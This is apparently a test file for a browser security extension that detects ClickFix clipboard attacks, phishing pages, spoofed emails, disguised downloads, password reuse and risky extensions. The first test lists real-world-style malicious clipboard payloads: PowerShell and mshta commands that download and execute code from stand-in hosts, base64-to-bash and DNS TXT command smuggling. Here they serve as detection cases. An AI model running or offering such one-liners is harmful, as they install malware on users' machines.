import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { analyzeEmail } from '../src/lib/email-analyzer.js';
import { assessDownload } from '../src/lib/download-guard.js';
import { createRecord, checkTyped, protectedLengths } from '../src/lib/password-alert.js';
import { registrationDate, ageFindings } from '../src/lib/rdap.js';
import { scoreExtension } from '../src/lib/ext-audit.js';
import { advancedPageFindings } from '../src/lib/page-analyzer.js';
import { parseHost } from '../src/lib/domain.js';

// Load the page-world clipboard hook in a sandbox to test its classifier.
const ctx = { module: { exports: {} } };
vm.runInNewContext(readFileSync(new URL('../src/content/clipboard-hook.js', import.meta.url), 'utf8'), ctx);
const { classify, LURE } = ctx.module.exports;

test('ClickFix: real-world malicious clipboard payloads are severe', () => {
  const bad = [
    'powershell -w hidden -c "iwr https://evil.example/p.ps1 | iex"',
    'powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
    'mshta https://check-captcha.example/verify.hta',
    'cmd /c start /min powershell -c "irm evil.example/x | iex"',
    'conhost.exe --headless powershell -c iex(irm 1.2.3.4/a)',
    'cmd /c nslookup -q=txt example.com 8.8.8.8 | findstr "^Name:" | cmd',
    'powershell -c "Start-Process calc" # ✅ I am not a robot - reCAPTCHA Verification ID: 7351',
    'echo Y3VybCAtcyBodHRwOi8vZXZpbC9h | base64 -d | bash',
    'msiexec /i https://evil.example/update.msi /qn',
  ];
  for (const b of bad) assert.equal(classify(b).level, 'severe', b);
});

test('ClickFix: ordinary copy-buttons are not severe', () => {
  for (const ok of ['npm install react', 'git clone https://github.com/x/y.git', 'Hello world', 'user@example.com', 'pip install requests']) {
    assert.notEqual(classify(ok).level, 'severe', ok);
  }
  // Docs install commands are "commands" (blocked only if the page also shows paste-and-run lures).
  assert.equal(classify('curl -fsSL https://get.docker.com | sh').level, 'command');
  assert.ok(LURE.test('Press Win + R, then Ctrl + V and Enter to verify you are human'));
  assert.ok(!LURE.test('How to install Node.js on Ubuntu'));
});

test('advanced page findings: AiTM clone, BitB, ClickFix lure (and official domains exempt)', () => {
  const S = { aitmDetect: true, bitbDetect: true, clickfixGuard: true };
  const page = { idpClone: { brand: 'Microsoft', evidence: ['page structure (#i0116)', 'loads aadcdn.msauth.net'] }, bitb: { shownUrl: 'https://accounts.google.com/signin', frameHost: 'evil.example' }, clickfixLure: ['Win + R', 'verify you are human'] };
  const ids = advancedPageFindings(page, parseHost('secure-login-portal.com'), null, S).map((f) => `${f.id}:${f.severity}`);
  assert.deepEqual(ids, ['aitm-clone:high', 'bitb:high', 'clickfix-lure:critical']);
  assert.equal(advancedPageFindings(page, parseHost('login.microsoftonline.com'), { name: 'Microsoft' }, { ...S, clickfixGuard: false }).length, 0);
  assert.equal(advancedPageFindings({ idpClone: { brand: 'Okta', evidence: ['x'] } }, parseHost('login.acme.com'), null, S)[0].severity, 'medium');
  assert.equal(advancedPageFindings(page, parseHost('x.com'), null, { aitmDetect: false, bitbDetect: false, clickfixGuard: false }).length, 0);
});

test('email analyzer: spoofed brand sender, mismatched link, disguised attachment', () => {
  const v = analyzeEmail({
    fromName: 'PayPal Security', fromEmail: 'alerts.paypal@gmail.com', subject: 'Urgent: account suspended',
    links: [{ text: 'www.paypal.com/verify', href: 'https://paypa1-verify.xyz/login' }],
    attachments: ['invoice.pdf.exe'], bodyText: 'Your account has been limited. Verify your account within 24 hours.',
  }, { sensitivity: 'balanced' });
  const ids = v.findings.map((f) => f.id);
  for (const id of ['mail-brand-spoof', 'mail-link-mismatch', 'mail-double-ext']) assert.ok(ids.includes(id), `${id} in ${ids}`);
  assert.equal(v.level, 'danger');
  const ok = analyzeEmail({ fromName: 'GitHub', fromEmail: 'noreply@github.com', links: [{ text: 'View it on GitHub', href: 'https://github.com/x/y/pull/1' }], attachments: [], bodyText: 'New comment' }, { sensitivity: 'balanced' });
  assert.equal(ok.level, 'safe', ok.findings.map((f) => f.id).join());
});

test('download guard: flags smuggling / disguise / flagged page, ignores normal installers', () => {
  assert.equal(assessDownload({ filename: '/dl/report.pdf.exe', url: 'https://x.com/a' }, null).severity, 'high');
  assert.equal(assessDownload({ filename: 'setup.exe', url: 'blob:https://evil.example/123' }, null).severity, 'high');
  assert.ok(assessDownload({ filename: 'invoice.zip', url: 'https://x.example/f' }, { level: 'danger', reason: 'Fake PayPal login' }).risky);
  assert.ok(assessDownload({ filename: 'invoice‮fdp.exe', url: 'https://x.example/f' }, null).risky);
  assert.equal(assessDownload({ filename: 'VSCodeUserSetup.exe', url: 'https://code.visualstudio.com/x' }, { level: 'safe' }).risky, false);
  assert.equal(assessDownload({ filename: 'photo.jpg', url: 'blob:https://x' }, null).risky, false);
});

test('password alarm: hashes only, detects reuse on the wrong site, allows the right one', async () => {
  const rec = await createRecord('Work Microsoft', 'Correct-Horse-9', ['microsoft.com', 'https://login.live.com']);
  assert.ok(!JSON.stringify(rec).includes('Correct-Horse-9'));
  assert.deepEqual(rec.domains, ['microsoft.com', 'live.com']);
  assert.deepEqual(protectedLengths([rec]), [15]);
  assert.equal((await checkTyped([rec], 'Correct-Horse-9', 'login.microsoft.com')).allowed, true);
  assert.equal((await checkTyped([rec], 'Correct-Horse-9', 'micros0ft-login.com')).allowed, false);
  assert.equal(await checkTyped([rec], 'Wrong-Horse-999', 'evil.com'), null);
  await assert.rejects(createRecord('x', 'short', ['a.com']));
});

test('RDAP: registration date parsing and age findings', () => {
  const d = registrationDate({ events: [{ eventAction: 'last changed', eventDate: '2026-01-01T00:00:00Z' }, { eventAction: 'registration', eventDate: '1997-09-15T04:00:00Z' }] });
  assert.equal(new Date(d).getUTCFullYear(), 1997);
  assert.equal(ageFindings(Date.now() - 2 * 86400_000)[0].id, 'rdap-new');
  assert.equal(ageFindings(Date.now() - 20 * 86400_000)[0].severity, 'medium');
  assert.equal(ageFindings(d)[0].weight, 0);
  assert.equal(registrationDate({}), null);
});

test('extension auditor scoring', () => {
  const evil = scoreExtension({ id: 'a', name: 'Free VPN', permissions: ['cookies', 'proxy', 'webRequest'], hostPermissions: ['<all_urls>'], installType: 'sideload', enabled: true }, 'self');
  assert.equal(evil.level, 'danger');
  const mild = scoreExtension({ id: 'b', name: 'Dark theme', permissions: ['storage'], hostPermissions: [], installType: 'normal', enabled: true }, 'self');
  assert.equal(mild.level, 'safe');
  assert.equal(scoreExtension({ id: 'self', name: 'me' }, 'self'), null);
});
